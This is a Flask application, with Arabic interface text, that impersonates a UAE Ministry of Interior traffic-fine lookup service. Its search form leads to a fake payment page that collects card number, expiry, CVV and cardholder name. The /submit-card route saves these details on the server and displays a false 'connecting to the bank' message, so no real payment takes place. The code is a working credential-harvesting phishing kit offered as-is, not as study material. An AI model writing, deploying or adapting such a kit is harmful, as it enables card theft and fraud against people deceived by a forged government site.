import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)
db = {"sessions": {}, "status": "waiting", "msg": ""}

# --- 1. الهيدر الرسمي الفخم ---
MOI_TOP_BAR = '''
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
    body { margin:0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background:#f7f8fa; direction: rtl; }
    .header-top { background: white; border-bottom: 1px solid #eee; padding: 15px 40px; display: flex; justify-content: space-between; align-items: center; }
    .header-tools { display: flex; align-items: center; gap: 25px; color: #555; font-size: 18px; font-weight: bold; }
    .menu-btn { background: #b0914f; color: white; padding: 10px 20px; border-radius: 6px; cursor: pointer; }
    .logo-area { background: white; text-align: center; padding: 20px 0; border-bottom: 5px solid #b0914f; }
    .logo-area img { width: 95%; max-width: 750px; }
</style>
<div class="header-top">
    <div class="header-tools">
        <span style="color:#b0914f; cursor:pointer;">EN | دخول</span>
        <i class="fa fa-info-circle"></i><i class="fa fa-volume-up"></i><i class="fa fa-search"></i>
    </div>
    <div class="menu-btn"><i class="fa fa-bars"></i></div>
</div>
<div class="logo-area">
    <img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg">
</div>
'''

# --- 2. الصفحة الرئيسية (الـ 9 صور الأصلية) ---
@app.route('/')
def index():
    html = MOI_TOP_BAR + '''
    <style>
        .hero { max-width: 1000px; margin: 0 auto; }
        .hero img { width: 100%; display: block; }
        .grid-container { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 1000px; margin: 30px auto; padding: 0 15px; }
        .grid-item { background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.08); cursor: pointer; }
        .grid-item img { width: 100%; display: block; }
        .btn-gold { display: block; width: 280px; margin: 40px auto; padding: 22px; background: #b0914f; color: white; border: none; border-radius: 12px; font-size: 24px; font-weight: bold; cursor: pointer; text-align: center; }
    </style>
    <div class="hero"><img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg"></div>
    <div class="grid-container">
        <div class="grid-item" onclick="location.href='/search'"><img src="https://static.wixstatic.com/media/a9f3d9_908f090c885e49048a1768656122557e~mv2.png"></div>
        <div class="grid-item" onclick="location.href='/search'"><img src="https://static.wixstatic.com/media/a9f3d9_33d7195d43e545089f3050965f7c3558~mv2.png"></div>
        <div class="grid-item" onclick="location.href='/search'"><img src="https://static.wixstatic.com/media/a9f3d9_6745f949c5e347719602e8609a32c3f9~mv2.png"></div>
        <div class="grid-item" onclick="location.href='/search'"><img src="https://static.wixstatic.com/media/a9f3d9_908f090c885e49048a1768656122557e~mv2.png"></div>
        <div class="grid-item" onclick="location.href='/search'"><img src="https://static.wixstatic.com/media/a9f3d9_33d7195d43e545089f3050965f7c3558~mv2.png"></div>
        <div class="grid-item" onclick="location.href='/search'"><img src="https://static.wixstatic.com/media/a9f3d9_6745f949c5e347719602e8609a32c3f9~mv2.png"></div>
        <div class="grid-item" onclick="location.href='/search'"><img src="https://static.wixstatic.com/media/a9f3d9_908f090c885e49048a1768656122557e~mv2.png"></div>
        <div class="grid-item" onclick="location.href='/search'"><img src="https://static.wixstatic.com/media/a9f3d9_33d7195d43e545089f3050965f7c3558~mv2.png"></div>
        <div class="grid-item" onclick="location.href='/search'"><img src="https://static.wixstatic.com/media/a9f3d9_6745f949c5e347719602e8609a32c3f9~mv2.png"></div>
    </div>
    <button class="btn-gold" onclick="location.href='/search'">ابدأ الخدمة</button>
    '''
    return render_template_string(html)

# --- 3. صفحة الاستعلام (النسخة الكاملة - لا ينقصها حرف) ---
@app.route('/search')
def search():
    html = MOI_TOP_BAR + '''
    <style>
        .card { background: white; width: 92%; max-width: 850px; margin: 40px auto; border-top: 10px solid #b0914f; padding: 50px; border-radius: 0 0 20px 20px; box-shadow: 0 15px 40px rgba(0,0,0,0.1); }
        .tabs { display: flex; gap: 10px; margin-bottom: 35px; border-bottom: 2px solid #eee; padding-bottom: 20px; }
        .tab { flex: 1; padding: 18px; text-align: center; background: #f5f5f5; border-radius: 10px; cursor: pointer; font-weight: bold; font-size: 18px; }
        .tab.active { background: #b0914f; color: white; }
        label { display: block; margin: 25px 0 10px; font-weight: bold; color: #444; font-size: 20px; }
        select, input { width: 100%; padding: 22px; border: 1.5px solid #ddd; border-radius: 12px; font-size: 20px; outline: none; box-sizing: border-box; background: #fafafa; }
        .btn-search { width: 100%; padding: 25px; background: #b0914f; color: white; border: none; border-radius: 12px; font-size: 26px; font-weight: bold; margin-top: 40px; cursor: pointer; }
    </style>
    <div class="card">
        <h1 style="text-align:center; margin-bottom:40px;">الاستعلام عن المخالفات</h1>
        <div class="tabs">
            <div class="tab active">بيانات اللوحة</div>
            <div class="tab">الرمز المروري</div>
            <div class="tab">بيانات الرخصة</div>
        </div>
        
        <label>الإمارة</label>
        <select>
            <option>أبوظبي / Abu Dhabi</option><option>دبي / Dubai</option><option>الشارقة / Sharjah</option>
            <option>عجمان / Ajman</option><option>أم القيوين / Umm Al Quwain</option><option>رأس الخيمة / Ras Al Khaimah</option><option>الفجيرة / Fujairah</option>
        </select>
        
        <div style="display:grid; grid-template-columns: 1fr 1fr; gap:25px;">
            <div>
                <label>مصدر اللوحة</label>
                <select>
                    <option>خصوصي / Private</option><option>تجاري / Commercial</option>
                    <option>دراجة نارية / Motorcycle</option><option>أجرة / Taxi</option>
                    <option>حافلة / Bus</option><option>تصدير / Export</option>
                </select>
            </div>
            <div><label>فئة اللوحة</label><input placeholder="أدخل الفئة (مثال: 1)"></div>
        </div>
        
        <label>رقم اللوحة</label><input placeholder="أدخل رقم اللوحة">
        <button class="btn-search" onclick="location.href='/checkout'">بدء الاستعلام</button>
    </div>
    '''
    return render_template_string(html)

# --- 4. صفحة الدفع (التفصيل الممل) ---
@app.route('/checkout')
def checkout():
    html = MOI_TOP_BAR + '''
    <style>
        .pay-card { max-width: 750px; margin: 50px auto; background: white; padding: 60px; border-radius: 25px; box-shadow: 0 20px 50px rgba(0,0,0,0.1); border-top: 10px solid #b0914f; }
        input { width: 100%; padding: 25px; margin-bottom: 25px; border: 2px solid #eee; border-radius: 15px; font-size: 22px; outline: none; box-sizing: border-box; }
        .pay-btn { width: 100%; padding: 30px; background: #b0914f; color: white; border: none; border-radius: 15px; font-size: 28px; font-weight: bold; cursor: pointer; }
    </style>
    <div class="pay-card">
        <h2 style="text-align:center; margin-bottom:45px;">بوابة الدفع الإلكتروني الموحدة</h2>
        <form action="/submit-card" method="POST">
            <label style="font-weight:bold; font-size:20px;">رقم البطاقة الائتمانية</label>
            <input name="card" placeholder="0000 0000 0000 0000" maxlength="19" required>
            <div style="display:flex; gap:25px;">
                <input name="exp" placeholder="MM/YY" maxlength="5" required>
                <input name="cvv" placeholder="CVV" maxlength="3" required>
            </div>
            <input name="holder" placeholder="اسم حامل البطاقة" required>
            <button type="submit" class="pay-btn">تأكيد ودفع</button>
        </form>
    </div>
    '''
    return render_template_string(html)

@app.route('/submit-card', methods=['POST'])
def sub():
    c = request.form.get('card') or "CARD"
    db['sessions'][c] = request.form.to_dict()
    return render_template_string('<body style="text-align:center;padding-top:200px;font-family:sans-serif;"><h2>جاري الاتصال بالبنك...</h2></body>')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
